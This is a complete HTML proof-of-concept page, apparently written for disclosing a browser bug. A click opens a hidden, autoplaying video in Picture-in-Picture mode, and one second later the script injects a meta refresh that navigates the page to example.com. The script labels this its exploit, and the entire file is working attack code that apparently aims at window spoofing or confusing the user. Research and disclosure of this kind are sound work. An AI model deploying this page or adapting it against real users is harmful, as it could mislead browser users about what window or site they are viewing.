<!doctype html>
<html lang="en">
<head>
  <title>PiP + Meta Refresh PoC</title>

  <style>
    #contents {
      width: 600px;
      font: 14px "Open Sans", sans-serif;
    }

    :picture-in-picture {
      box-shadow: 0 0 0 5px red;
    }
  </style>
</head>

<body>
  <div id="contents">
    <p>Click the button below</p>

    <video id="video" src="v4.mp4" muted autoplay style="display:none"></video>

    <div id="controlbar"></div>
  </div>

<script>
let video;

window.addEventListener("load", () => {
  video = document.getElementById("video");

  if (document.pictureInPictureEnabled) {
    const btn = document.createElement("button");
    btn.textContent = "Click Me";
    btn.onclick = startExploit;
    document.getElementById("controlbar").appendChild(btn);
  }
});

function startExploit() {
  video.requestPictureInPicture({
    width: 257,
    height: 340,
    disallowReturnToOpener: true,
  }).then(() => {

    // Inject meta refresh AFTER PiP is opened
    setTimeout(() => {
      const meta = document.createElement("meta");
      meta.httpEquiv = "refresh";
      meta.content = "0;url=https://example.com";
      document.head.appendChild(meta);
    }, 1000);

  });
}
</script>

</body>
</html>
